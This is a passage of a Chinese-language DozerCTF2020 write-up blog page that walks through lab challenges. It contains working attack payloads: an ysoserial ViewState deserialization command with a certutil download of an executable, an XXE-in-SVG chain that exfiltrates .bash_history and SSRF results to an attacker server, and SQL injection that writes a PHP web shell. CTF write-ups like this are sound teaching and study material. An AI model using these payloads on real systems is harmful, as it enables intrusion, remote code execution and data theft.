+        alt="https://gitee.com/leonsec/images/raw/master/QQ图片20200616223909.png"
+        title="https://gitee.com/leonsec/images/raw/master/QQ图片20200616223909.png" /></p>
+<p>使用<code>ysoserial.exe</code>生成序列化<code>payload</code>：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bat" data-lang="bat">ysoserial.exe -p ViewState -g TextFormattingRunProperties -c <span class="s2">&#34;cmd.exe /c certutil.exe -urlcache -split -f http://ip/test.exe&#34;</span> --validationalg=<span class="s2">&#34;SHA1&#34;</span> --validationkey=<span class="s2">&#34;CB2721ABDAF8E9DC516D621D8B8BF13A2C9E8689A25303BF&#34;</span> --generator=<span class="s2">&#34;B97B4E27&#34;</span> --viewstateuserkey=<span class="s2">&#34;247061cc-fb54-4d4e-bb66-233ffc8e3848&#34;</span> --isdebug -islegacy
+</code></pre></td></tr></table>
+</div>
+</div><h3 id="获得shell">获得shell</h3>
+<p>这里写一个msf马，因为这台机器没有杀软
+<code>payload</code>:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-text" data-lang="text">https://ip/ecp/default.aspx?__VIEWSTATEGENERATOR=B97B4E27&amp;__VIEWSTAT
+E=&lt;ViewState&gt;
+</code></pre></td></tr></table>
+</div>
+</div><p>将<code>&lt;ViewState&gt;</code>替换为<code>ysoserial.exe</code>生成的序列化内容并进行url编码：
+<img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://gitee.com/leonsec/images/raw/master/QQ%e5%9b%be%e7%89%8720200616224912.png"
+        data-srcset="https://gitee.com/leonsec/images/raw/master/QQ%e5%9b%be%e7%89%8720200616224912.png, https://gitee.com/leonsec/images/raw/master/QQ%e5%9b%be%e7%89%8720200616224912.png 1.5x, https://gitee.com/leonsec/images/raw/master/QQ%e5%9b%be%e7%89%8720200616224912.png 2x"
+        data-sizes="auto"
+        alt="https://gitee.com/leonsec/images/raw/master/QQ图片20200616224912.png"
+        title="https://gitee.com/leonsec/images/raw/master/QQ图片20200616224912.png" />
+即图中红框位置</p>
+<p>访问获得shell，flag在桌面：<code>Dozerctf{1193173239563ee49664b5e500f687ba}</code></p>
+<h1 id="简单域渗透-flag5">简单域渗透-flag5</h1>
+<p>环境没了，等源码复现</p>
+<h1 id="svgggggg">svgggggg!</h1>
+<p>这题是一个<code>盲打XXE</code>打<code>SSRF</code>，关于SVG图片的漏洞可以参考：
+<a href="https://www.fortinet.com/blog/threat-research/scalable-vector-graphics-attack-surface-anatomy" target="_blank" rel="noopener noreffer">Anatomy of Scalable Vector Graphics (SVG) Attack Surface on the Web</a></p>
+<blockquote>
+<p>SVG，代表可扩展矢量图形是一种基于 XML 的矢量图像格式，用于二维图形，支持交互性和动画。SVG 图像及其行为在 XML 文本文件中定义。可以使用任何文本编辑器以及绘图软件创建和编辑它们。所有主要的现代 Web 浏览器都有 SVG 渲染支持。</p>
+</blockquote>
+<p>简单测试了一下发现没有回显，需要外带信息
+在vps上构造恶意svg和xml：
+<code>xxx.svg</code>:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-xml" data-lang="xml"><span class="cp">&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;</span>
+<span class="cp">&lt;!DOCTYPE note [
+</span><span class="cp">&lt;!ENTITY % int SYSTEM &#34;http://ip:8500/a.xml&#34;&gt;</span>
+%int;
+%all;
+%send;
+]&gt;
+<span class="nt">&lt;svg</span> <span class="na">height=</span><span class="s">&#34;100&#34;</span> <span class="na">width=</span><span class="s">&#34;1000&#34;</span><span class="nt">&gt;</span>
+  <span class="nt">&lt;text</span> <span class="na">x=</span><span class="s">&#34;10&#34;</span> <span class="na">y=</span><span class="s">&#34;20&#34;</span><span class="nt">&gt;</span><span class="ni">&amp;send;</span><span class="nt">&lt;/text&gt;</span>
+<span class="nt">&lt;/svg&gt;</span>
+</code></pre></td></tr></table>
+</div>
+</div><p><code>a.xml</code>:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-xml" data-lang="xml"><span class="cp">&lt;!ENTITY % file SYSTEM &#34;php://filter/read=convert.base64-encode/resource=/home/r1ck/.bash_history&#34;&gt;</span>
+
+<span class="cp">&lt;!ENTITY % all &#34;&lt;!ENTITY % send SYSTEM &#39;http://ip:8500/?%file;&#39;&gt;</span>&#34;&gt;
+</code></pre></td></tr></table>
+</div>
+</div><p>根据提示拿到用户<code>r1ck</code>的操作记录：
+<img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://gitee.com/leonsec/images/raw/master/QQ%e5%9b%be%e7%89%8720200617150330.png"
+        data-srcset="https://gitee.com/leonsec/images/raw/master/QQ%e5%9b%be%e7%89%8720200617150330.png, https://gitee.com/leonsec/images/raw/master/QQ%e5%9b%be%e7%89%8720200617150330.png 1.5x, https://gitee.com/leonsec/images/raw/master/QQ%e5%9b%be%e7%89%8720200617150330.png 2x"
+        data-sizes="auto"
+        alt="https://gitee.com/leonsec/images/raw/master/QQ图片20200617150330.png"
+        title="https://gitee.com/leonsec/images/raw/master/QQ图片20200617150330.png" /></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash"><span class="nb">cd</span> /app
+php -S 0.0.0.0:8080
+</code></pre></td></tr></table>
+</div>
+</div><p>可以看到在8080端口有web服务，由于靶机是内网穿透出来的，所以我们不能直接访问到8080端口，只能利用xxe打ssrf</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-xml" data-lang="xml"><span class="cp">&lt;!ENTITY % file SYSTEM &#34;php://filter/read=convert.base64-encode/resource=http://127.0.0.1:8080/&#34;&gt;</span>
+
+<span class="cp">&lt;!ENTITY % all &#34;&lt;!ENTITY % send SYSTEM &#39;http://59.110.157.4:8500/?%file;&#39;&gt;</span>&#34;&gt;
+</code></pre></td></tr></table>
+</div>
+</div><p>得到：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-text" data-lang="text">&lt;!doctype html&gt;
+&lt;html&gt;
+&lt;head&gt;
+&lt;meta charset=&#34;UTF-8&#34;&gt;
+&lt;title&gt;index&lt;/title&gt;
+&lt;/head&gt;
+Hi!
+You Find Me .
+Flag is nearby.
+&lt;body&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+
+Array
+(
+    [id] =&gt; 1
+    [name] =&gt; test
+)
+</code></pre></td></tr></table>
+</div>
+</div><p>发现是个sql注入，尝试注入发现列数为2，然后根据提示写shell
+要进行url编码</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-xml" data-lang="xml"><span class="cp">&lt;!ENTITY % file SYSTEM &#34;php://filter/read=convert.base64-encode/resource=http://127.0.0.1:8080/?id=1%27%20union%20select%201,%27%3c?php%20system($%5fGET%5bcmd%5d)%3b?%3e%27%20into%20outfile%27/app/leon.php%27%23&#34;&gt;</span>
+
+<span class="cp">&lt;!ENTITY % all &#34;&lt;!ENTITY % send SYSTEM &#39;http://ip:8500/?%file;&#39;&gt;</span>&#34;&gt;
+</code></pre></td></tr></table>
+</div>
+</div><p>shell语句部分也可以进行hex编码：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-xml" data-lang="xml"><span class="cp">&lt;!ENTITY % file SYSTEM &#34;php://filter/read=convert.base64-encode/resource=http://127.0.0.1:8080/?id=1%27%20union%20select%201,0x3c3f7068702073797374656d28245f4745545b636d645d293b3f3e%20into%20outfile%27/app/leon.php%27%23&#34;&gt;</span>
+
+<span class="cp">&lt;!ENTITY % all &#34;&lt;!ENTITY % send SYSTEM &#39;http://ip:8500/?%file;&#39;&gt;</span>&#34;&gt;
+</code></pre></td></tr></table>
+</div>
+</div><p>写进去后直接利用即可：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-xml" data-lang="xml"><span class="cp">&lt;!ENTITY % file SYSTEM &#34;php://filter/read=convert.base64-encode/resource=http://127.0.0.1:8080/leon.php?cmd=ls&#34;&gt;</span>
+
+<span class="cp">&lt;!ENTITY % all &#34;&lt;!ENTITY % send SYSTEM &#39;http://ip:8500/?%file;&#39;&gt;</span>&#34;&gt;
+</code></pre></td></tr></table>
+</div>
+</div><p>看到flag文件直接cat拿到flag</p></div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 2020-06-15</span>
+            </div>
+            <div class="post-info-license"></div>
+        </div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="https://clq0.top/dozerctf2020-writeup/" data-title="DozerCTF2020 Writeup" data-hashtags="域渗透,SSRF,XXE,RCE,SQL注入"><i class="fab fa-twitter fa-fw"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="https://clq0.top/dozerctf2020-writeup/" data-hashtag="域渗透"><i class="fab fa-facebook-square fa-fw"></i></a><a href="javascript:void(0);" title="Share on Reddit" data-sharer="reddit" data-url="https://clq0.top/dozerctf2020-writeup/"><i class="fab fa-reddit fa-fw"></i></a><a href="javascript:void(0);" title="Share on 微博" data-sharer="weibo" data-url="https://clq0.top/dozerctf2020-writeup/" data-title="DozerCTF2020 Writeup"><i class="fab fa-weibo fa-fw"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw"></i>&nbsp;<a href="/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/">域渗透</a>,&nbsp;<a href="/tags/ssrf/">SSRF</a>,&nbsp;<a href="/tags/xxe/">XXE</a>,&nbsp;<a href="/tags/rce/">RCE</a>,&nbsp;<a href="/tags/sql%E6%B3%A8%E5%85%A5/">SQL注入</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/php-create_function/" class="prev" rel="prev" title="PHP Create_function()"><i class="fas fa-angle-left fa-fw"></i>PHP Create_function()</a>
+            <a href="/%E4%B8%AD%E8%AE%A1%E9%87%8F%E7%AC%AC%E4%B8%80%E5%B1%8A%E5%A4%A7%E5%AD%A6%E7%94%9Fctf%E7%AB%9E%E8%B5%9B-writeup/" class="next" rel="next" title="（中计量）第一届大学生CTF竞赛 Writeup">（中计量）第一届大学生CTF竞赛 Writeup<i class="fas fa-angle-right fa-fw"></i></a></div>
+</div>
+<div id="comments"><div id="valine" class="comment"></div><noscript>
+                Please enable JavaScript to view the comments powered by <a href="https://valine.js.org/">Valine</a>.
+            </noscript></div></article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line"><a>本网站由</a><a href="https://www.upyun.com/?utm_source=lianmeng&utm_medium=referral" target="-blank"><img src="/upyun_logo2.png" width="4%" style="vertical-align:middle"></a><a>提供CDN加速/云存储服务</a></div><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2020 - 2021</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="http://clq0.top" target="_blank">Leon</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span><span class="icp-splitter">&nbsp;|&nbsp;</span><br class="icp-br"/>
+                    <span class="icp"><script type="text/javascript" src="https://s9.cnzz.com/z_stat.php?id=1278765080&web_id=1278765080"></script></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
+                <i class="fas fa-arrow-up fa-fw"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+                <i class="fas fa-comment fa-fw"></i>
+            </a>
+        </div><link rel="stylesheet" href="/lib/valine/valine.min.css"><link rel="stylesheet" href="/lib/lightgallery/lightgallery.min.css"><link rel="stylesheet" href="/lib/katex/katex.min.css"><link rel="stylesheet" href="/lib/katex/copy-tex.min.css"><link rel="stylesheet" href="/lib/cookieconsent/cookieconsent.min.css"><script type="text/javascript" src="/lib/valine/Valine.min.js"></script><script type="text/javascript" src="/lib/smooth-scroll/smooth-scroll.min.js"></script><script type="text/javascript" src="/lib/autocomplete/autocomplete.min.js"></script><script type="text/javascript" src="/lib/lunr/lunr.min.js"></script><script type="text/javascript" src="/lib/lazysizes/lazysizes.min.js"></script><script type="text/javascript" src="/lib/lightgallery/lightgallery.min.js"></script><script type="text/javascript" src="/lib/lightgallery/lg-thumbnail.min.js"></script><script type="text/javascript" src="/lib/lightgallery/lg-zoom.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/sharer/sharer.min.js"></script><script type="text/javascript" src="/lib/katex/katex.min.js"></script><script type="text/javascript" src="/lib/katex/auto-render.min.js"></script><script type="text/javascript" src="/lib/katex/copy-tex.min.js"></script><script type="text/javascript" src="/lib/katex/mhchem.min.js"></script><script type="text/javascript" src="/lib/cookieconsent/cookieconsent.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":40},"comment":{"valine":{"appId":"saBpLNPwjiIGzpSf9QvvTLw3-9Nh9j0Va","appKey":"jU0L8JdQYxxwunKTXrmGV194","avatar":"mp","el":"#valine","emojiCDN":"https://cdn.jsdelivr.net/npm/emoji-datasource-google@5.0.1/img/google/64/","emojiMaps":{"100":"1f4af.png","alien":"1f47d.png","anger":"1f4a2.png","angry":"1f620.png","anguished":"1f627.png","astonished":"1f632.png","black_heart":"1f5a4.png","blue_heart":"1f499.png","blush":"1f60a.png","bomb":"1f4a3.png","boom":"1f4a5.png","broken_heart":"1f494.png","brown_heart":"1f90e.png","clown_face":"1f921.png","cold_face":"1f976.png","cold_sweat":"1f630.png","confounded":"1f616.png","confused":"1f615.png","cry":"1f622.png","crying_cat_face":"1f63f.png","cupid":"1f498.png","dash":"1f4a8.png","disappointed":"1f61e.png","disappointed_relieved":"1f625.png","dizzy":"1f4ab.png","dizzy_face":"1f635.png","drooling_face":"1f924.png","exploding_head":"1f92f.png","expressionless":"1f611.png","face_vomiting":"1f92e.png","face_with_cowboy_hat":"1f920.png","face_with_hand_over_mouth":"1f92d.png","face_with_head_bandage":"1f915.png","face_with_monocle":"1f9d0.png","face_with_raised_eyebrow":"1f928.png","face_with_rolling_eyes":"1f644.png","face_with_symbols_on_mouth":"1f92c.png","face_with_thermometer":"1f912.png","fearful":"1f628.png","flushed":"1f633.png","frowning":"1f626.png","ghost":"1f47b.png","gift_heart":"1f49d.png","green_heart":"1f49a.png","grimacing":"1f62c.png","grin":"1f601.png","grinning":"1f600.png","hankey":"1f4a9.png","hear_no_evil":"1f649.png","heart":"2764-fe0f.png","heart_decoration":"1f49f.png","heart_eyes":"1f60d.png","heart_eyes_cat":"1f63b.png","heartbeat":"1f493.png","heartpulse":"1f497.png","heavy_heart_exclamation_mark_ornament":"2763-fe0f.png","hole":"1f573-fe0f.png","hot_face":"1f975.png","hugging_face":"1f917.png","hushed":"1f62f.png","imp":"1f47f.png","innocent":"1f607.png","japanese_goblin":"1f47a.png","japanese_ogre":"1f479.png","joy":"1f602.png","joy_cat":"1f639.png","kiss":"1f48b.png","kissing":"1f617.png","kissing_cat":"1f63d.png","kissing_closed_eyes":"1f61a.png","kissing_heart":"1f618.png","kissing_smiling_eyes":"1f619.png","laughing":"1f606.png","left_speech_bubble":"1f5e8-fe0f.png","love_letter":"1f48c.png","lying_face":"1f925.png","mask":"1f637.png","money_mouth_face":"1f911.png","nauseated_face":"1f922.png","nerd_face":"1f913.png","neutral_face":"1f610.png","no_mouth":"1f636.png","open_mouth":"1f62e.png","orange_heart":"1f9e1.png","partying_face":"1f973.png","pensive":"1f614.png","persevere":"1f623.png","pleading_face":"1f97a.png","pouting_cat":"1f63e.png","purple_heart":"1f49c.png","rage":"1f621.png","relaxed":"263a-fe0f.png","relieved":"1f60c.png","revolving_hearts":"1f49e.png","right_anger_bubble":"1f5ef-fe0f.png","robot_face":"1f916.png","rolling_on_the_floor_laughing":"1f923.png","scream":"1f631.png","scream_cat":"1f640.png","see_no_evil":"1f648.png","shushing_face":"1f92b.png","skull":"1f480.png","skull_and_crossbones":"2620-fe0f.png","sleeping":"1f634.png","sleepy":"1f62a.png","slightly_frowning_face":"1f641.png","slightly_smiling_face":"1f642.png","smile":"1f604.png","smile_cat":"1f638.png","smiley":"1f603.png","smiley_cat":"1f63a.png","smiling_face_with_3_hearts":"1f970.png","smiling_imp":"1f608.png","smirk":"1f60f.png","smirk_cat":"1f63c.png","sneezing_face":"1f927.png","sob":"1f62d.png","space_invader":"1f47e.png","sparkling_heart":"1f496.png","speak_no_evil":"1f64a.png","speech_balloon":"1f4ac.png","star-struck":"1f929.png","stuck_out_tongue":"1f61b.png","stuck_out_tongue_closed_eyes":"1f61d.png","stuck_out_tongue_winking_eye":"1f61c.png","sunglasses":"1f60e.png","sweat":"1f613.png","sweat_drops":"1f4a6.png","sweat_smile":"1f605.png","thinking_face":"1f914.png","thought_balloon":"1f4ad.png","tired_face":"1f62b.png","triumph":"1f624.png","two_hearts":"1f495.png","unamused":"1f612.png","upside_down_face":"1f643.png","weary":"1f629.png","white_frowning_face":"2639-fe0f.png","white_heart":"1f90d.png","wink":"1f609.png","woozy_face":"1f974.png","worried":"1f61f.png","yawning_face":"1f971.png","yellow_heart":"1f49b.png","yum":"1f60b.png","zany_face":"1f92a.png","zipper_mouth_face":"1f910.png","zzz":"1f4a4.png"},"enableQQ":false,"highlight":true,"lang":"en","pageSize":10,"placeholder":"Your comment ...","recordIP":true,"visitor":true}},"cookieconsent":{"content":{"dismiss":"Got it!","link":"Learn more","message":"This website uses Cookies to improve your experience."},"enable":true,"palette":{"button":{"background":"#f0f0f0"},"popup":{"background":"#1aa3ff"}},"theme":"edgeless"},"lightGallery":{"actualSize":false,"exThumbImage":"data-thumbnail","hideBarsDelay":2000,"selector":".lightgallery","speed":400,"thumbContHeight":80,"thumbWidth":80,"thumbnail":true},"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false},"search":{"highlightTag":"em","lunrIndexURL":"/index.json","maxResultLength":10,"noResultsFound":"No results found","snippetLength":50,"type":"lunr"}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+</html>
